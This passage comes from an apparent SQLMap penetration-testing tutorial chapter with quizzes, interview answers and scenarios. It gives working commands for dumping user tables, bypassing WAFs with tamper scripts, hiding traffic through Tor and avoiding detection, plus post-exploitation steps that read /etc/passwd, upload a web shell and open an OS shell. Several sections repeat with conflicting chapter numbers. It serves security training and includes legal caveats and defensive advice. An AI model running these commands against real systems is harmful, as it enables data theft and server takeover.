│                          └─────────┬──────────┘                             │
│                                    │                                        │
│          ┌─────────────────────────┼─────────────────────────┐             │
│          ▼                         ▼                         ▼             │
│   ┌──────────────┐        ┌──────────────┐        ┌──────────────┐        │
│   │  IN-BAND     │        │    BLIND     │        │ OUT-OF-BAND  │        │
│   │              │        │              │        │              │        │
│   │ - Error-based│        │ - Boolean    │        │ - DNS        │        │
│   │ - Union-based│        │ - Time-based │        │ - HTTP       │        │
│   └──────────────┘        └──────────────┘        └──────────────┘        │
│                                                                             │
│   Detection Speed:   Fast ───────────────────────► Slow                    │
│   Data Extracted:    More ───────────────────────► Less                    │
│   Common in apps:    Common ───────────────────────► Rare                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Enumeration Process

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    ENUMERATION PROCESS                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Step 1          Step 2          Step 3          Step 4                   │
│   ──────          ──────          ──────          ──────                   │
│   ┌─────┐        ┌─────┐        ┌─────┐        ┌─────┐                    │
│   │ DBs │───────►│Tables│──────►│Cols │──────►│Data │                    │
│   └─────┘        └─────┘        └─────┘        └─────┘                    │
│                                                                             │
│   --dbs          --tables       --columns      --dump                      │
│                                                                             │
│   Example flow:                                                             │
│   ┌───────────────────────────────────────────────────────────────────┐    │
│   │ sqlmap -u "URL" --dbs                                            │    │
│   │   → found: mydb, testdb                                          │    │
│   │                                                                   │    │
│   │ sqlmap -u "URL" -D mydb --tables                                 │    │
│   │   → found: users, products, orders                               │    │
│   │                                                                   │    │
│   │ sqlmap -u "URL" -D mydb -T users --columns                       │    │
│   │   → found: id, username, password, email                         │    │
│   │                                                                   │    │
│   │ sqlmap -u "URL" -D mydb -T users --dump                          │    │
│   │   → extracted: 100 user records                                  │    │
│   └───────────────────────────────────────────────────────────────────┘    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 🔗 RELATED CHAPTERS

| Chapter | Title | Relevance |
|---------|-------|-----------|
| Chapter 33 | John the Ripper | Cracking extracted password hashes |
| Chapter 35 | Metasploit Framework | Post-exploitation after SQLi |
| Chapter 40 | Web Application Security | OWASP Top 10 context |
| Chapter 41 | Network Scanning | Target discovery |
| Chapter 42 | Enumeration Techniques | Information gathering |
| Chapter 43 | Exploitation Basics | Using SQLi for access |
| Chapter 50 | Database Security | Secure database design |

---

## 🏆 BONUS ADVANCED CONTENT

### Technique 1: Advanced Tamper Script Usage

Combine multiple tamper scripts for WAF bypass:

```bash
# List all available tamper scripts
sqlmap --list-tampers

# Common combinations for WAF bypass
sqlmap -u "URL" --tamper=apostrophemask,randomcase --batch
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
sqlmap -u "URL" --tamper=charencode --batch

# Create custom tamper script
cat > /usr/share/sqlmap/tamper/custom_bypass.py << 'EOF'
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    # Custom bypass logic
    payload = payload.replace("SELECT", "SeLeCt")
    payload = payload.replace(" ", "/**/")
    return payload
EOF
```

### Technique 2: Automated SQLMap Scanning Script

```bash
#!/bin/bash
# SQLMap Automated Scanner
# Usage: ./sqlmap_scan.sh target_url

URL=$1
OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "[*] Starting SQLMap scan for: $URL"

# Phase 1: Detection
echo "[*] Phase 1: Detection"
sqlmap -u "$URL" --batch --random-agent \
    -o $OUTPUT_DIR/detection.log

# Phase 2: Enumeration
echo "[*] Phase 2: Database Enumeration"
sqlmap -u "$URL" --batch --dbs \
    -o $OUTPUT_DIR/databases.txt

# Phase 3: Table Enumeration
echo "[*] Phase 3: Table Enumeration"
for db in $(grep -oP '\[\*\] \K.*' $OUTPUT_DIR/databases.txt); do
    sqlmap -u "$URL" -D "$db" --batch --tables \
        >> $OUTPUT_DIR/tables.txt
done

# Phase 4: Generate Report
echo "[*] Generating Report"
cat << EOF > $OUTPUT_DIR/report.txt
SQLMap Scan Report
==================
Target: $URL
Date: $(date)
Results Directory: $OUTPUT_DIR
EOF

echo "[+] Scan complete. Results in: $OUTPUT_DIR"
```

### Technique 3: SQLMap with Custom Injection Points

Test specific injection points with markers:

```bash
# Mark injection point with *
sqlmap -u "http://target.com/page?id=1*&user=test" --batch

# Test specific parameter only
sqlmap -u "http://target.com/page?id=1&user=test" -p id --batch

# Test headers
sqlmap -u "http://target.com/" \
    --headers="X-Forwarded-For: 127.0.0.1*\nUser-Agent: test*" \
    --batch

# Cookie injection
sqlmap -u "http://target.com/" \
    --cookie="session=abc; user=admin*" \
    --batch

# POST JSON with injection point
sqlmap -u "http://target.com/api" \
    --data='{"id":"1*","name":"test"}' \
    --headers="Content-Type: application/json" \
    --batch

# Complex nested JSON
sqlmap -u "http://target.com/api" \
    --data='{"user":{"id":"1*"}}' \
    --headers="Content-Type: application/json" \
    --batch
```

---

## 📝 CHAPTER SUMMARY CHECKLIST

- [ ] Understood SQL injection types and risks
- [ ] Installed SQLMap in Termux
- [ ] Learned basic commands (-u, --dbs, --tables, --dump)
- [ ] Used --batch for non-interactive mode
- [ ] Tested POST parameters with --data
- [ ] Configured cookies and headers
- [ ] Applied tamper scripts for WAF bypass
- [ ] Used --level and --risk appropriately
- [ ] Handled blind SQL injection scenarios
- [ ] Completed all practice exercises

---

## 🎮 INTERACTIVE QUIZ

Test your SQLMap knowledge! Click to reveal answers.

<details>
<summary><b>Q1: What is the basic syntax for running SQLMap against a URL?</b></summary>

Answer: **`sqlmap -u "http://target.com/page?id=1"`**

```bash
sqlmap -u "http://target.com/page?id=1" --batch
```
The `--batch` flag runs SQLMap in non-interactive mode, automatically selecting default options.
</details>

<details>
<summary><b>Q2: Which flag lists all databases on the target?</b></summary>

Answer: **`--dbs`**

```bash
sqlmap -u "http://target.com/page?id=1" --dbs --batch
```
This enumerates all accessible databases on the target system.
</details>

<details>
<summary><b>Q3: How do you specify a particular database to work with?</b></summary>

Answer: **Using `-D` flag**

```bash
sqlmap -u "http://target.com/page?id=1" -D database_name --tables --batch
```
`-D` selects the database, then `--tables` lists its tables.
</details>

<details>
<summary><b>Q4: What is the difference between --level and --risk?</b></summary>

Answer: **Scope vs Aggressiveness**

| Option | Purpose | Range |
|--------|---------|-------|
| `--level` | Number of tests/payloads | 1-5 |
| `--risk` | Aggressiveness/damage potential | 1-3 |

```bash
sqlmap -u "URL" --level=3 --risk=2 --batch
```
Higher level = more thorough testing. Higher risk = more aggressive techniques.
</details>

<details>
<summary><b>Q5: How do you dump data from a specific table?</b></summary>

Answer: **Using `-D`, `-T`, and `--dump`**

```bash
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --dump --batch
```
This extracts all data from the specified table.
</details>

<details>
<summary><b>Q6: What flag enables testing POST data?</b></summary>

Answer: **`--data` flag**

```bash
sqlmap -u "http://target.com/login.php" \
       --data="username=admin&password=test" \
       --batch
```
This tests POST parameters instead of URL parameters.
</details>

<details>
<summary><b>Q7: How do you specify cookies for authenticated testing?</b></summary>

Answer: **Using `--cookie` flag**

```bash
sqlmap -u "http://target.com/page.php?id=1" \
       --cookie="PHPSESSID=abc123xyz; session=admin" \
       --batch
```
This includes session cookies in requests for authenticated testing.
</details>

<details>
<summary><b>Q8: What are tamper scripts used for?</b></summary>

Answer: **Bypassing WAF/IDS filters**

```bash
sqlmap -u "http://target.com/page?id=1" \
       --tamper=space2comment \
       --batch
```
Tamper scripts modify payloads to evade Web Application Firewalls.
Common tampers: `space2comment`, `between`, `randomcase`, `charencode`
</details>

<details>
<summary><b>Q9: How do you test a specific parameter only?</b></summary>

Answer: **Using `-p` flag**

```bash
sqlmap -u "http://target.com/page?id=1&cat=5" -p id --batch
```
This tests only the `id` parameter, ignoring others.
</details>

<details>
<summary><b>Q10: What is --technique used for?</b></summary>

Answer: **Specifying SQL injection techniques**

```bash
# B = Boolean-based blind
# E = Error-based
# U = Union query-based
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries

sqlmap -u "URL" --technique=BEU --batch  # Use Boolean, Error, Union
```
</details>

<details>
<summary><b>Q11: How do you use SQLMap with a request file from Burp?</b></summary>

Answer: **Using `-r` flag**

```bash
sqlmap -r request.txt --batch
```
Save the HTTP request from Burp Suite to a file, then use `-r` to test all parameters in that request.
</details>

<details>
<summary><b>Q12: What does --current-user do?</b></summary>

Answer: **Shows the database user being used**

```bash
sqlmap -u "http://target.com/page?id=1" --current-user --batch
```
Useful for identifying privilege level and potential escalation opportunities.
</details>

<details>
<summary><b>Q13: How do you check if the current user is a database administrator?</b></summary>

Answer: **Using `--is-dba`**

```bash
sqlmap -u "http://target.com/page?id=1" --is-dba --batch
```
Returns whether the current database user has DBA (administrator) privileges.
</details>

<details>
<summary><b>Q14: How do you run SQLMap through Tor?</b></summary>

Answer: **Using `--tor` flag**

```bash
# Start Tor first
tor &

# Run SQLMap through Tor
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5 --batch
```
This routes all traffic through the Tor network for anonymity.
</details>

<details>
<summary><b>Q15: How do you specify specific columns to dump?</b></summary>

Answer: **Using `-C` flag**

```bash
sqlmap -u "http://target.com/page?id=1" \
       -D dbname -T users \
       -C "username,password,email" \
       --dump --batch
```
This extracts only the specified columns from the table.
</details>

---

## 🎯 INTERVIEW QUESTIONS

### Q1: Explain the different types of SQL injection and how SQLMap handles them.

**Answer:**

**SQL Injection Types:**

| Type | Description | SQLMap Technique |
|------|-------------|------------------|
| **In-Band** | Results visible in response | B, E, U |
| **Blind** | No visible results | B, T |
| **Out-of-Band** | Different channel for data | Q |

**Technique Codes:**
- **B (Boolean-based):** True/false conditions
- **E (Error-based):** Error messages leak data
- **U (Union-based):** UNION SELECT for data extraction
- **S (Stacked queries):** Multiple statements
- **T (Time-based):** Time delays indicate success
- **Q (Inline queries):** Embedded queries

**SQLMap Auto-Detection:**
```bash
# SQLMap automatically tries all techniques
sqlmap -u "URL" --batch

# Specific technique
sqlmap -u "URL" --technique=T --batch  # Time-based only
```

---

### Q2: What is the difference between --level and --risk? When would you increase them?

**Answer:**

**--level (1-5):**
- Controls NUMBER of tests/payloads
- Higher = more thorough coverage
- Tests more HTTP headers at higher levels
- Level 3+ tests Cookie, Referer headers

**--risk (1-3):**
- Controls AGGRESSIVENESS of tests
- Higher = more potentially damaging
- Risk 2 adds OR-based tests
- Risk 3 adds heavy queries

**When to Increase:**
```bash
# Level: When injection not found with defaults
sqlmap -u "URL" --level=5 --batch

# Risk: When sure target can handle load
sqlmap -u "URL" --risk=3 --batch

# Combined for tough targets
sqlmap -u "URL" --level=5 --risk=3 --batch
```

**Caution:** High risk can cause:
- Database locks
- Service degradation
- Account lockouts
- Data corruption

---

### Q3: How would you approach testing a web application with SQLMap?

**Answer:**

**Systematic Approach:**

**Phase 1: Discovery**
```bash
# Basic scan with default settings
sqlmap -u "http://target.com/page?id=1" --batch

# Check current user and privileges
sqlmap -u "URL" --current-user --is-dba --batch
```

**Phase 2: Enumeration**
```bash
# List databases
sqlmap -u "URL" --dbs --batch

# List tables in specific database
sqlmap -u "URL" -D target_db --tables --batch

# List columns in table
sqlmap -u "URL" -D target_db -T users --columns --batch
```

**Phase 3: Data Extraction**
```bash
# Dump specific data
sqlmap -u "URL" -D target_db -T users -C "user,pass" --dump --batch
```

**Phase 4: Advanced (if DBA)**
```bash
# Read files
sqlmap -u "URL" --file-read="/etc/passwd"

# Execute commands (if possible)
sqlmap -u "URL" --os-shell
```

---

### Q4: Explain tamper scripts and when to use them.

**Answer:**

**Purpose:** Modify SQL payloads to bypass WAF/IDS filters.

**Common Tamper Scripts:**

| Script | Purpose |
|--------|---------|
| `space2comment` | Replace spaces with /**/ |
| `between` | Replace > with NOT BETWEEN |
| `randomcase` | Randomize case |
| `charencode` | URL encode characters |
| `base64encode` | Base64 encode payload |
| `equaltolike` | Replace = with LIKE |

**Usage:**
```bash
# Single tamper
sqlmap -u "URL" --tamper=space2comment --batch

# Multiple tampers
sqlmap -u "URL" --tamper=space2comment,between --batch
```

**When to Use:**
- WAF blocks requests
- IDS detects SQL patterns
- Keywords are filtered
- Special characters blocked

**Detection:**
```bash
# Test without tamper first
# If blocked, try common tampers
sqlmap -u "URL" --tamper=space2comment --batch
```

---

### Q5: How do you handle authentication and session management in SQLMap?

**Answer:**

**Cookie-Based Authentication:**
```bash
sqlmap -u "URL" --cookie="PHPSESSID=abc123" --batch
```

**HTTP Authentication:**
```bash
# Basic Auth
sqlmap -u "URL" --auth-type=Basic --auth-cred="user:pass"

# NTLM Auth
sqlmap -u "URL" --auth-type=NTLM --auth-cred="user:pass"
```

**Bearer Token:**
```bash
sqlmap -u "URL" --headers="Authorization: Bearer token123"
```

**Request File (from Burp):**
```bash
# Save request from Burp, includes all headers/cookies
sqlmap -r request.txt --batch
```

**Session Handling:**
```bash
# Eval code for dynamic tokens
sqlmap -u "URL" --eval="import hashlib; token=hashlib.md5('value').hexdigest()"
```

---

### Q6: What is the significance of --threads option and how does it affect testing?

**Answer:**

**Purpose:** Controls concurrent HTTP requests.

```bash
sqlmap -u "URL" --threads=10 --batch
```

**Trade-offs:**

| Threads | Speed | Detection Risk | Server Load |
|---------|-------|----------------|-------------|
| 1 | Slow | Low | Minimal |
| 5 | Medium | Medium | Moderate |
| 10 | Fast | Higher | High |
| 20+ | Very Fast | High | Heavy |

**Best Practices:**
- Default: 1 (safest)
- For fast targets: 5-10
- For stealth: 1
- For authorized heavy testing: 10-20

**When to Use Higher Threads:**
- Authorized testing
- Fast target servers
- Time constraints
- Large data extraction

**When to Avoid:**
- WAF/IDS present
- Rate-limited targets
- Production systems
- Need for stealth

---

### Q7: How would you use SQLMap with Tor for anonymous testing?

**Answer:**

**Setup and Usage:**
```bash
# 1. Install and start Tor
pkg install tor
tor &

# 2. Verify Tor is running
# Tor typically runs on port 9050

# 3. Run SQLMap through Tor
sqlmap -u "http://target.com/page?id=1" \
       --tor \
       --tor-type=SOCKS5 \
       --check-tor \
       --batch
```

**Important Considerations:**
- Tor is SLOW - expect longer test times
- Some targets block Tor exit nodes
- Not foolproof - advanced tracking possible
- Always combine with other OpSec measures

**Additional Anonymity:**
```bash
# Random User-Agent
sqlmap -u "URL" --tor --random-agent --batch

# Through Tor with specific port
sqlmap -u "URL" --tor --tor-port=9050 --batch
```

---

### Q8: Explain blind SQL injection and how SQLMap detects it.

**Answer:**

**Blind SQL Injection:**
- No visible error messages or data
- Must infer results from behavior
- Two types: Boolean-based and Time-based

**Boolean-Based Detection:**
```bash
# SQLMap tests TRUE/FALSE conditions
# TRUE: Normal page response
# FALSE: Different response or error

sqlmap -u "URL" --technique=B --batch
```

**Time-Based Detection:**
```bash
# SQLMap uses time delays
# TRUE: Response delayed
# FALSE: Normal response time

sqlmap -u "URL" --technique=T --batch

# Specify delay time
sqlmap -u "URL" --technique=T --time-sec=5 --batch
```

**Detection Process:**
1. SQLMap sends various payloads
2. Measures response differences
3. Confirms injection point
4. Begins data extraction bit by bit

**Speed Considerations:**
- Blind injection is SLOW
- Boolean-based faster than time-based
- Use `--threads` cautiously
- Consider bandwidth/timeout settings

---

### Q9: How do you handle WAF bypass with SQLMap?

**Answer:**

**Step-by-Step WAF Bypass:**

**1. Identify WAF:**
```bash
sqlmap -u "URL" --identify-waf --batch
```

**2. Basic Bypass Techniques:**

**Encoding:**
```bash
sqlmap -u "URL" --tamper=charencode --batch
sqlmap -u "URL" --tamper=base64encode --batch
```

**Case Manipulation:**
```bash
sqlmap -u "URL" --tamper=randomcase --batch
```

**Comment Injection:**
```bash
sqlmap -u "URL" --tamper=space2comment --batch
```

**3. Multiple Tamper Scripts:**
```bash
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
```

**4. Increase Level:**
```bash
sqlmap -u "URL" --level=5 --tamper=space2comment --batch
```

**5. Custom Prefix/Suffix:**
```bash
sqlmap -u "URL" --prefix="'))" --suffix="-- -" --batch
```

**6. HTTP Methods:**
```bash
# Try different HTTP methods
sqlmap -u "URL" --method=PUT --batch
```

---

### Q10: What are the legal and ethical considerations when using SQLMap?

**Answer:**

**Legal Requirements:**
- Written authorization required
- Defined scope of testing
- Data protection compliance (GDPR, etc.)
- Document all activities

**Ethical Guidelines:**

| DO | DON'T |
|----| -----|
| Get permission first | Test unauthorized systems |
| Stay within scope | Exceed authorized limits |
| Protect found data | Steal or expose data |
| Report responsibly | Publicly disclose findings |
| Clean up traces | Leave malicious payloads |
| Document everything | Hide testing activities |

**Safe Testing Practices:**
```bash
# Use test environments
# DVWA, bWAPP, SQLi Labs

# Practice targets
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch
```

**Documentation Requirements:**
- Authorization letters
- Scope documentation
- Testing timeline
- Findings report
- Remediation recommendations

**Legal Consequences:**
- Computer Fraud and Abuse Act (USA)
- IT Act Section 66 (India)
- Computer Misuse Act (UK)
- Criminal prosecution possible

---

## 🔥 REAL-WORLD SCENARIOS

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                     SCENARIO 1: Web Application Assessment                  ║
╚═══════════════════════════════════════════════════════════════════════════╝

📌 Situation:
A company's e-commerce website needs security assessment before launch. 
The application has product pages with ID parameters.

🎯 Objective:
Identify and document SQL injection vulnerabilities.

🔧 Approach:
# Step 1: Basic vulnerability scan
sqlmap -u "https://shop.example.com/product?id=123" --batch

# Step 2: Enumerate databases
sqlmap -u "URL" --dbs --batch

# Step 3: Check for DBA privileges
sqlmap -u "URL" --is-dba --current-user --batch

# Step 4: Document findings
sqlmap -u "URL" --schema --batch

📊 Results:
- Found SQL injection in product ID parameter
- Database: MySQL 5.7
- User: webapp_user (not DBA)
- Recommended parameterized queries implementation

⚠️ Notes:
- Used non-destructive testing
- Documented all findings for development team
- Recommended pre-commit hooks for SQL injection prevention
```

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                     SCENARIO 2: Authenticated Testing                       ║
╚═══════════════════════════════════════════════════════════════════════════╝

📌 Situation:
An internal HR application needs security testing. Access requires 
authentication via login page.

🎯 Objective:
Test authenticated SQL injection vulnerabilities.

🔧 Approach:
# Step 1: Capture authenticated request in Burp
# Save to file: hr_request.txt

# Step 2: Test with captured session
sqlmap -r hr_request.txt --batch

# Step 3: Test specific parameter
sqlmap -r hr_request.txt -p employee_id --batch

# Step 4: Enumerate if vulnerable
sqlmap -r hr_request.txt --dbs --batch

📊 Results:
- Found injection in employee search parameter
- Access to HR database with sensitive PII
- Recommended immediate remediation
- Session timeout implementation needed

⚠️ Notes:
- Session management critical for testing
- Request files preserve full context
- Coordinate with development team
```

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                     SCENARIO 3: WAF Bypass Challenge                        ║
╚═══════════════════════════════════════════════════════════════════════════╝

📌 Situation:
A client's web application has a WAF that's blocking standard SQLMap 
requests. Need to find bypass technique.

🎯 Objective:
Successfully test for SQL injection despite WAF protection.

🔧 Approach:
# Step 1: Identify WAF type
sqlmap -u "URL" --identify-waf --batch

# Step 2: Try common bypass techniques
sqlmap -u "URL" --tamper=space2comment --batch
sqlmap -u "URL" --tamper=between --batch

# Step 3: Combine techniques
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch

# Step 4: Try encoding
sqlmap -u "URL" --tamper=charencode --batch

📊 Results:
- WAF identified as ModSecurity
- space2comment + randomcase bypass successful
- Injection found in search parameter
- Recommended WAF rule tuning and parameterized queries

⚠️ Notes:
- Document bypass techniques for client
- WAF bypass demonstrates defense depth needed
- Multiple layers of security still important
```

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                     SCENARIO 4: Blind SQL Injection Testing                 ║
╚═══════════════════════════════════════════════════════════════════════════╝

📌 Situation:
An application shows generic error messages and no visible data. 
Suspected blind SQL injection.

🎯 Objective:
Confirm and exploit blind SQL injection.

🔧 Approach:
# Step 1: Test for boolean-based blind
sqlmap -u "URL" --technique=B --batch -v 3

# Step 2: Test for time-based blind
sqlmap -u "URL" --technique=T --time-sec=5 --batch

# Step 3: Once confirmed, enumerate
sqlmap -u "URL" --technique=T --dbs --threads=3 --batch

# Step 4: Extract specific data
sqlmap -u "URL" --technique=T -D db -T users --dump --batch

📊 Results:
- Confirmed time-based blind injection
- Extraction took 4 hours (slow due to technique)
- Found admin credentials
- Recommended input validation and error handling

⚠️ Notes:
- Blind injection is time-consuming
- Use threads cautiously to avoid detection
- May need session management for long tests
```

```
╔═══════════════════════════════════════════════════════════════════════════╗
║                     SCENARIO 5: Post-Exploitation                          ║
╚═══════════════════════════════════════════════════════════════════════════╝

📌 Situation:
SQLMap found DBA privileges on a database server. Client wants to know 
extent of possible damage.

🎯 Objective:
Demonstrate full impact of SQL injection with DBA access.

🔧 Approach:
# Step 1: Confirm DBA access
sqlmap -u "URL" --is-dba --batch

# Step 2: Read system files
sqlmap -u "URL" --file-read="/etc/passwd"

# Step 3: Check for write capability
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/"

# Step 4: Get OS shell (if possible)
sqlmap -u "URL" --os-shell

# Step 5: Get SQL shell
sqlmap -u "URL" --sql-shell

📊 Results:
- Full database access confirmed
- Could read sensitive system files
- Web shell upload successful
- Recommended: Principle of least privilege, file permissions

⚠️ Notes:
- This demonstrates maximum impact
- Always document thoroughly
- Recommend comprehensive security improvements
```

---

## ⚠️ SECURITY BEST PRACTICES

### ✅ DO's - Ethical SQLMap Usage

| Practice | Description |
|----------|-------------|
| ✅ **Get Authorization** | Written permission before any testing |
| ✅ **Define Scope** | Clear boundaries on what to test |
| ✅ **Use Test Targets** | Practice on DVWA, bWAPP, SQLi Labs |
| ✅ **Document Everything** | Log all commands and results |
| ✅ **Protect Data** | Securely handle any extracted data |
| ✅ **Report Responsibly** | Follow responsible disclosure |
| ✅ **Clean Up** | Remove any test data/artifacts |
| ✅ **Use --batch** | Avoid accidental destructive actions |
| ✅ **Test Non-Destructive** | Use enumeration before dumping |
| ✅ **Stay Legal** | Know applicable laws |

### ❌ DON'Ts - What to Avoid

| Practice | Consequence |
|----------|-------------|
| ❌ **Test Without Permission** | Criminal liability |
| ❌ **Dump All Data** | Privacy violations |
| ❌ **Use High Risk on Production** | Service disruption |
| ❌ **Ignore WAF** | Detection and blocking |
| ❌ **Skip Documentation** | No audit trail |
| ❌ **Exceed Scope** | Contract violation |
| ❌ **Public Disclosure** | Legal action |
| ❌ **Modify Data** | Data integrity issues |
| ❌ **Ignore Time Constraints** | Extended testing impact |
| ❌ **Share Vulnerabilities** | Information leakage |

### 🛡️ Defensive Recommendations

```bash
# For Developers - SQL Injection Prevention:

# 1. Use Parameterized Queries
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

# 2. Input Validation
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);

# 3. Least Privilege Database Users
# Don't use root/admin accounts for applications

# 4. Error Handling
# Don't expose database errors to users

# 5. Web Application Firewall
# Deploy WAF with SQL injection rules

# 6. Regular Security Testing
# Conduct periodic penetration tests
```

---

## 📊 ARCHITECTURE DIAGRAMS

### Diagram 1: SQLMap Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      SQLMAP ATTACK WORKFLOW                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐            │
│  │   DETECTION  │     │ ENUMERATION  │     │   EXTRACTION │            │
│  │              │     │              │     │              │            │
│  │ • Fingerprint│     │ • Databases  │     │ • Dump data  │            │
│  │ • Injection  │────►│ • Tables     │────►│ • Read files │            │
│  │   points     │     │ • Columns    │     │ • OS access  │            │
│  └──────────────┘     └──────────────┘     └──────────────┘            │
│         │                    │                    │                     │
│         ▼                    ▼                    ▼                     │
│  ┌──────────────────────────────────────────────────────────────────┐   │
│  │                      TARGET DATABASE                              │   │
│  │   ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐        │   │
│  │   │  MySQL  │   │PostgreSQL│   │  MSSQL  │   │ Oracle  │        │   │
│  │   └─────────┘   └─────────┘   └─────────┘   └─────────┘        │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Diagram 2: SQL Injection Techniques

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION TECHNIQUES                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                    IN-BAND (Visible Results)                     │    │
│  │  ┌────────────────────┐    ┌────────────────────┐              │    │
│  │  │   Error-Based      │    │   Union-Based      │              │    │
│  │  │   (Technique E)    │    │   (Technique U)    │              │    │
│  │  │                    │    │                    │              │    │
│  │  │ Extract from       │    │ UNION SELECT       │              │    │
│  │  │ error messages     │    │ for data           │              │    │
│  │  └────────────────────┘    └────────────────────┘              │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                    BLIND (Inferred Results)                      │    │
│  │  ┌────────────────────┐    ┌────────────────────┐              │    │
│  │  │   Boolean-Based    │    │   Time-Based       │              │    │
│  │  │   (Technique B)    │    │   (Technique T)    │              │    │
│  │  │                    │    │                    │              │    │
│  │  │ TRUE/FALSE         │    │ Response delay     │              │    │
│  │  │ responses          │    │ indicates success  │              │    │
│  │  └────────────────────┘    └────────────────────┘              │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Diagram 3: SQLMap Options Hierarchy

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SQLMAP OPTIONS OVERVIEW                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│                        ┌─────────────────┐                               │
│                        │    Target       │                               │
│                        │  Specification  │                               │
│                        │  -u / -r / -l   │                               │
│                        └────────┬────────┘                               │
│                                 │                                        │
│         ┌───────────────────────┼───────────────────────┐               │
│         │                       │                       │               │
│         ▼                       ▼                       ▼               │
│  ┌─────────────┐         ┌─────────────┐         ┌─────────────┐        │
│  │   Request   │         │  Detection  │         │ Enumeration │        │
│  │   Options   │         │   Options   │         │   Options   │        │
│  │             │         │             │         │             │        │
│  │ --cookie    │         │ --level     │         │ --dbs       │        │
│  │ --data      │         │ --risk      │         │ --tables    │        │
│  │ --headers   │         │ --technique │         │ --columns   │        │
│  │ --proxy     │         │ --tamper    │         │ --dump      │        │
│  │ --threads   │         │ --prefix    │         │ --schema    │        │
│  └─────────────┘         └─────────────┘         └─────────────┘        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 🔗 RELATED CHAPTERS

| Chapter | Title | Relation |
|---------|-------|----------|
| **Ch33** | John the Ripper | Cracking extracted password hashes |
| **Ch35** | Metasploit Framework | Post-SQL injection exploitation |
| **Ch45** | Network Scanning | Target discovery with Nmap |
| **Ch48** | Web Application Attacks | Manual SQL injection techniques |
| **Ch50** | Password Attacks | Using extracted credentials |
| **Ch46** | Enumeration | Database enumeration concepts |
| **Ch31** | Hydra Password Cracking | Testing database credentials |

---

## 🏆 BONUS ADVANCED CONTENT

### Technique 1: Automated SQLMap Workflow

Create automated testing scripts:

```bash
#!/bin/bash
# SQLMap automated assessment script

TARGET=$1
OUTPUT_DIR="sqlmap_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "[*] Starting SQLMap assessment..."

# Phase 1: Detection
echo "[*] Phase 1: Detection"
sqlmap -u "$TARGET" --batch --threads=5 \
       -o "$OUTPUT_DIR/detection.txt"

# Phase 2: Enumeration
echo "[*] Phase 2: Enumeration"
sqlmap -u "$TARGET" --batch \
       --dbs --current-user --is-dba \
       -o "$OUTPUT_DIR/enumeration.txt"

# Phase 3: Schema
echo "[*] Phase 3: Schema extraction"
sqlmap -u "$TARGET" --batch --schema \
       -o "$OUTPUT_DIR/schema.txt"

echo "[*] Assessment complete. Results in $OUTPUT_DIR/"
```

---

### Technique 2: Custom Tamper Script Creation

Create your own tamper scripts:

```python
#!/usr/bin/env python
# custom_tamper.py
# Save in: ~/.sqlmap/tamper/custom_tamper.py

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Custom tamper script for specific WAF bypass
    """
    if payload:
        # Replace spaces with double URL encoded space
        payload = payload.replace(" ", "%20%20")
        
        # Replace common keywords
        payload = payload.replace("SELECT", "SeLeCt")
        payload = payload.replace("UNION", "UnIoN")
        
    return payload
```

**Usage:**
```bash
sqlmap -u "URL" --tamper=custom_tamper --batch
```

---

### Technique 3: SQLMap API Usage

Use SQLMap's REST API for integration:

```bash
# Start SQLMap API server
python sqlmapapi.py -s -H 0.0.0.0 -p 8775

# Create new task
curl -X POST http://localhost:8775/task/new

# Start scan (use returned task ID)
curl -X POST http://localhost:8775/scan/TASK_ID/start \
     -d "url=http://target.com/page?id=1"

# Check status
curl http://localhost:8775/scan/TASK_ID/status

# Get results
curl http://localhost:8775/scan/TASK_ID/data

# Python integration
import requests
import json

api_url = "http://localhost:8775"

# Create task
task = requests.post(f"{api_url}/task/new").json()
task_id = task["taskid"]

# Start scan
scan_data = {"url": "http://target.com/page?id=1"}
requests.post(f"{api_url}/scan/{task_id}/start", data=scan_data)
```

---

## 📝 CHAPTER SUMMARY CHECKLIST

### Core Concepts Mastered
- [ ] Understood SQL injection types
- [ ] Learned SQLMap installation and setup
- [ ] Mastered basic commands (-u, --dbs, --tables)
- [ ] Applied enumeration techniques
- [ ] Used authentication options

### Technical Skills Developed
- [ ] Database enumeration
- [ ] Data extraction with --dump
- [ ] POST request testing
